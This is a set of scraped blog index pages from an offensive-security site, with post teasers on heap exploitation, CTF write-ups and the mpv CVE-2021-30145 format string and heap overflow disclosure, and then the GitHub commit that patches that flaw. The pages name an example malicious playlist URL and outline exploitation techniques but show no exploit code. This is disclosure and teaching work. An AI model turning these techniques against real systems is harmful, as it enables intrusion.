[Continue reading “nullcon HackIM 2019 – babypwn”](https://devel0pment.de/?p=1191#more-1191)

Posted on [14. August 201814. August 2018](https://devel0pment.de/?p=688)
## [Heap Exploitation: Off-By-One / Poison Null Byte](https://devel0pment.de/?p=688)

![](https://devel0pment.de/wp-content/uploads/2018/08/poison_null.png)

The goal of this article is to explain in detail how an off-by-one vulnerability on the heap also known as *poison null byte* can be exploited. Although this technique does not work with the latest libc, I think it can be used very good in order to demonstrate how exploits based on heap-metadata corruption work (also check out [shellphish’s how2heap](https://github.com/shellphish/how2heap)).

In order to do this I created a vulnerable program, which we will use as an example to create such an exploit. If you like to, you can start by analyzing and exploiting the program on your own (at least check out [Environment](https://devel0pment.de/?p=688#env)):

–> [heap.zip](https://devel0pment.de/wp-content/uploads/2018/08/heap.zip)

Though it is not required to the exploit the program, the source-code might be helpful:

–> [heap.c](https://devel0pment.de/wp-content/uploads/2018/08/heap.c)

The article is divided into the following sections:

–> [Environment](https://devel0pment.de/?p=688#env)

–> [Vulnerable Program](https://devel0pment.de/?p=688#vuln)

–> [Heap Basics](https://devel0pment.de/?p=688#basic)

–> [Libc-Leak](https://devel0pment.de/?p=688#libc)

–> [Control Instruction Pointer](https://devel0pment.de/?p=688#rip)

–> [One Gadget](https://devel0pment.de/?p=688#oneg)

–> [Final Exploit](https://devel0pment.de/?p=688#final)

[Continue reading “Heap Exploitation: Off-By-One / Poison Null Byte”](https://devel0pment.de/?p=688#more-688)

Posted on [22. May 2018](https://devel0pment.de/?p=461)
## [Hacky Easter 2018 writeup](https://devel0pment.de/?p=461)

|  | As every year [hacking-lab.com](https://www.hacking-lab.com/index.html) carried out the annual **Hacky Easter** event with 27 challenges. I could not spend as much time as I would have liked to on solving the challenges, but after all I managed to collect 25 of the 27 eggs and focused on this writeup. |
| --- | --- |

|  | Easy |
| --- | --- |
| [**01** Prison Break](https://devel0pment.de/?p=461#chlg01) [**02** Babylon](https://devel0pment.de/?p=461#chlg02) [**03** Pony Coder](https://devel0pment.de/?p=461#chlg03) [**04** Memeory](https://devel0pment.de/?p=461#chlg04) [**05** Sloppy & Paste (mobile)](https://devel0pment.de/?p=461#chlg05) [**06** Cooking for Hackers](https://devel0pment.de/?p=461#chlg06) [**07** Jigsaw](https://devel0pment.de/?p=461#chlg07) [**08** Disco Egg](https://devel0pment.de/?p=461#chlg08) [**09** Dial Trial (mobile)](https://devel0pment.de/?p=461#chlg09) | |
|  | Medium |
| [**10** Level Two](https://devel0pment.de/?p=461#chlg10) [**11** De Egg you must (not solved)](https://devel0pment.de/?p=461#chlg11) [**12** Patience (mobile)](https://devel0pment.de/?p=461#chlg12) [**13** Sagittarius…](https://devel0pment.de/?p=461#chlg13) [**14** Same same…](https://devel0pment.de/?p=461#chlg14) [**15** Manila greetings](https://devel0pment.de/?p=461#chlg15) [**16** git cloak –hard](https://devel0pment.de/?p=461#chlg16) [**17** Space Invaders](https://devel0pment.de/?p=461#chlg17) [**18** Egg Factory](https://devel0pment.de/?p=461#chlg18) | |
|  | Hard |
| [**19** Virtual Hen](https://devel0pment.de/?p=461#chlg19) [**20** Artist: No Name Yet (not solved)](https://devel0pment.de/?p=461#chlg20) [**21** Hot Dog](https://devel0pment.de/?p=461#chlg21) [**22** Block Jane](https://devel0pment.de/?p=461#chlg22) [**23** Rapbid Learning](https://devel0pment.de/?p=461#chlg23) [**24** ELF](https://devel0pment.de/?p=461#chlg24) | |
|  | Hidden |
| [**25** Hidden Egg #1](https://devel0pment.de/?p=461#chlg25) [**26** Hidden Egg #2](https://devel0pment.de/?p=461#chlg26) [**27** Hidden Egg #3](https://devel0pment.de/?p=461#chlg27) | |

[Continue reading “Hacky Easter 2018 writeup”](https://devel0pment.de/?p=461#more-461)

Posted on [21. March 20183. January 2019](https://devel0pment.de/?p=451)
## [angstromCTF 2018 – writeup hellcode](https://devel0pment.de/?p=451)

The [angstromCTF 2018](https://angstromctf.com/) ([ctftime.org](https://ctftime.org/event/577)) ran from 16/03/2018, 20:00 UTC to 23/03/2018 00:00 UTC.

As the description on *ctftime.org* states, the ctf is *primarily geared towards high school students but with a very wide range of challenge difficulty*.

There have been a lot of interesting challenges which have been fun to do. I decided to make a writeup for the pwn challenge *hellcode*.

[Continue reading “angstromCTF 2018 – writeup hellcode”](https://devel0pment.de/?p=451#more-451)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_5191e953_20250115_113126.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Tag: CVE-2021-30145

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217)
## [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

[Continue reading “mpv media player – mf custom protocol vulnerability (CVE-2021-30145)”](https://devel0pment.de/?p=2217#more-2217)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_620ae8f2_20250115_113124.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Tag: linux

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217)
## [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

[Continue reading “mpv media player – mf custom protocol vulnerability (CVE-2021-30145)”](https://devel0pment.de/?p=2217#more-2217)

Posted on [1. January 202124. January 2021](https://devel0pment.de/?p=2084)
## [HACKvent20 writeup](https://devel0pment.de/?p=2084)

|  | This year’s [HACKvent](https://hacking-lab.com) hosted on [competition.hacking-lab.com](https://competition.hacking-lab.com) has been as great as every year.There was a total amount of 28 awesome challenges with varying difficulties. |
| --- | --- |

| |  | [HV20.(-1) Twelve steps of christmas](?p=2084#_1) | | --- | --- | |  | [HV20.01 Happy HACKvent 2020](?p=2084#01) | |  | [HV20.02 Chinese Animals](?p=2084#02) | |  | [HV20.03 Packed gifts](?p=2084#03) | |  | [HV20.04 Br❤celet](?p=2084#04) | |  | [HV20.05 Image DNA](?p=2084#05) | | |  | [HV20.13 Twelve steps of christmas](?p=2084#13) | | --- | --- | |  | [HV20.14 Santa’s Special GIFt](?p=2084#14) | |  | [HV20.15 Man Commands, Server Lost](?p=2084#15) | |  | [HV20.16 Naughty Rudolph](?p=2084#16) | |  | [HV20.17 Santa’s Gift Factory Control](?p=2084#17) | |  | [HV20.18 Santa’s lost home](?p=2084#18) | |  | [HV20.19 Docker Linter Service](?p=2084#19) | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| |  | [HV20.06 Twelve steps of christmas](?p=2084#06) | | --- | --- | |  | [HV20.07 Bad morals](?p=2084#07) | |  | [HV20.08 The game](?p=2084#08) | |  | [HV20.09 Santa’s Gingerbread Factory](?p=2084#09) | |  | [HV20.10 Be patient with the adjacent](?p=2084#10) | |  | [HV20.11 Chris’mas carol](?p=2084#11) | |  | [HV20.12 Wiener waltz](?p=2084#12) | | |  | [HV20.20 Twelve steps of Christmas](?p=2084#20) | | --- | --- | |  | [HV20.21 Threatened Cat](?p=2084#21) | |  | [HV20.22 Padawanlock](?p=2084#22) | |  | [HV20.23 Those who make backups are cowards!](?p=2084#23) | |  | [HV20.24 Santa’s Secure Data Storage](?p=2084#24) | |  | [HV20.H1 It’s a secret!](?p=2084#h1) | |  | [HV20.H2 Oh, another secret!](?p=2084#h2) | |  | [HV20.H3 Hidden in Plain Sight](?p=2084#h3) | |

[Continue reading “HACKvent20 writeup”](https://devel0pment.de/?p=2084#more-2084)

Posted on [23. May 202024. May 2020](https://devel0pment.de/?p=1593)
## [Hack The Box – Rope](https://devel0pment.de/?p=1593)

![](https://devel0pment.de/wp-content/uploads/2019/01/htb.png)

This article contains my writeup on the machine `Rope` from [Hack The Box](https://www.hackthebox.eu/). I really enjoyed the box, since it provides a total of three custom binaries, which are supposed to be exploited 🙂

![](https://devel0pment.de/wp-content/uploads/2019/10/htb_rope.png)

The article is divided into the following parts:

→ [User](https://devel0pment.de/?p=1593#user)
    – [Initial Recon](https://devel0pment.de/?p=1593#recon)
    – [httpserver](https://devel0pment.de/?p=1593#httpserver)
    – [Leak Memory Address](https://devel0pment.de/?p=1593#leak)
    – [Exploit Format String Vulnerability](https://devel0pment.de/?p=1593#fmt)
    – [Escalating from john to r4j (readlogs)](https://devel0pment.de/?p=1593#user_escalate)

→ [Root](https://devel0pment.de/?p=1593#root)
    – [Local Recon](https://devel0pment.de/?p=1593#recon2)
    – [contact](https://devel0pment.de/?p=1593#contact)
    – [Bruteforce](https://devel0pment.de/?p=1593#bruteforce)
    – [Libc Leak](https://devel0pment.de/?p=1593#libcleak)
    – [Final Exploit](https://devel0pment.de/?p=1593#finalexploit)

[Continue reading “Hack The Box – Rope”](https://devel0pment.de/?p=1593#more-1593)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from github.com_538d3eca_20250114_184645.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmpv-player%2Fmpv%2Fcommit%2Fd0c530919d8cd4d7a774e38ab064e0fabdae34e6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmpv-player%2Fmpv%2Fcommit%2Fd0c530919d8cd4d7a774e38ab064e0fabdae34e6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mpv-player%2Fmpv)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mpv-player](/mpv-player)
/
**[mpv](/mpv-player/mpv)**
Public

* [Notifications](/login?return_to=%2Fmpv-player%2Fmpv) You must be signed in to change notification settings
* [Fork
  3k](/login?return_to=%2Fmpv-player%2Fmpv)
* [Star
   29.3k](/login?return_to=%2Fmpv-player%2Fmpv)

* [Code](/mpv-player/mpv)
* [Issues
  881](/mpv-player/mpv/issues)
* [Pull requests
  95](/mpv-player/mpv/pulls)
* [Discussions](/mpv-player/mpv/discussions)
* [Actions](/mpv-player/mpv/actions)
* [Wiki](/mpv-player/mpv/wiki)
* [Security](/mpv-player/mpv/security)
* [Insights](/mpv-player/mpv/pulse)

Additional navigation options

* [Code](/mpv-player/mpv)
* [Issues](/mpv-player/mpv/issues)
* [Pull requests](/mpv-player/mpv/pulls)
* [Discussions](/mpv-player/mpv/discussions)
* [Actions](/mpv-player/mpv/actions)
* [Wiki](/mpv-player/mpv/wiki)
* [Security](/mpv-player/mpv/security)
* [Insights](/mpv-player/mpv/pulse)

## Commit

[Permalink](/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

demux\_mf: improve format string processing

[Browse files](/mpv-player/mpv/tree/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)
Browse the repository at this point in the history

```
Before this commit, the user could specify a printf format string
which wasn't verified, and could result in:
- Undefined behavior due to missing or non-matching arguments.
- Buffer overflow due to untested result length.

The offending code was added at commit [103a960](https://github.com/mpv-player/mpv/commit/103a960925a147adb113e0e4aab1159caade126c) (2002, mplayer svn):
git-svn-id: svn://svn.mplayerhq.hu/mplayer/trunk@4566 b3059339-0415-0410-9bf9-f77b7e298cf2

It moved around but was not modified meaningfully until now.

Now we reject all conversion specifiers at the format except %%
and a simple subset of the valid specifiers. Also, we now use
snprintf to avoid buffer overflow.

The format string is provided by the user as part of mf:// URI.

Report and initial patch by Stefan Schiller.
Patch reviewed by [@jeeb](https://github.com/jeeb), [@sfan5](https://github.com/sfan5), Stefan Schiller.
```

* Loading branch information

[![@avih](https://avatars.githubusercontent.com/u/2164962?s=40&v=4)](/avih)

[avih](/mpv-player/mpv/commits?author=avih "View all commits by avih")
committed
Apr 5, 2021

1 parent
[ef9596f](/mpv-player/mpv/commit/ef9596f78ede35dd6aef999d774c76e0e447243d)

commit d0c5309

Showing
**1 changed file**
with
**37 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

39 changes: 37 additions & 2 deletions

39
[demux/demux\_mf.c](#diff-0d847e49633638550fa1ae8e38f2ec3e503acd10ce18ae615d5aced437840a82 "demux/demux_mf.c")

Show comments

[View file](/mpv-player/mpv/blob/d0c530919d8cd4d7a774e38ab064e0fabdae34e6/demux/demux_mf.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -121,7 +121,8 @@ static mf\_t \*open\_mf\_pattern(void \*talloc\_ctx, struct demuxer \*d, char \*filename |
|  |  | goto exit\_mf; |
|  |  | } |
|  |  |  |
|  |  | char \*fname = talloc\_size(mf, strlen(filename) + 32); |
|  |  | size\_t fname\_avail = strlen(filename) + 32; |
|  |  | char \*fname = talloc\_size(mf, fname\_avail); |
|  |  |  |
|  |  | #if HAVE\_GLOB |
|  |  | if (!strchr(filename, '%')) { |
| Expand All | | @@ -148,10 +149,44 @@ static mf\_t \*open\_mf\_pattern(void \*talloc\_ctx, struct demuxer \*d, char \*filename |
|  |  | } |
|  |  | #endif |
|  |  |  |
|  |  | // We're using arbitrary user input as printf format with 1 int argument. |
|  |  | // Any format which uses exactly 1 int argument would be valid, but for |
|  |  | // simplicity we reject all conversion specifiers except %% and simple |
|  |  | // integer specifier: %[.][NUM]d where NUM is 1-3 digits (%.d is valid) |
|  |  | const char \*f = filename; |
|  |  | int MAXDIGS = 3, nspec = 0, bad\_spec = 0, c; |
|  |  |  |
|  |  | while (nspec < 2 && (c = \*f++)) { |
|  |  | if (c != '%') |
|  |  | continue; |
|  |  | if (\*f != '%') { |
|  |  | nspec++; // conversion specifier which isn't %% |
|  |  | if (\*f == '.') |
|  |  | f++; |
|  |  | for (int ndig = 0; mp\_isdigit(\*f) && ndig < MAXDIGS; ndig++, f++) |
|  |  | /\* no-op \*/; |
|  |  | if (\*f != 'd') { |
|  |  | bad\_spec++; // not int, or beyond our validation capacity |
|  |  | break; |
|  |  | } |
|  |  | } |
|  |  | // \*f is '%' or 'd' |
|  |  | f++; |
|  |  | } |
|  |  |  |
|  |  | // nspec==0 (zero specifiers) is rejected because fname wouldn't advance. |
|  |  | if (bad\_spec || nspec != 1) { |
|  |  | mp\_err(log, "unsupported expr format: '%s'\n", filename); |
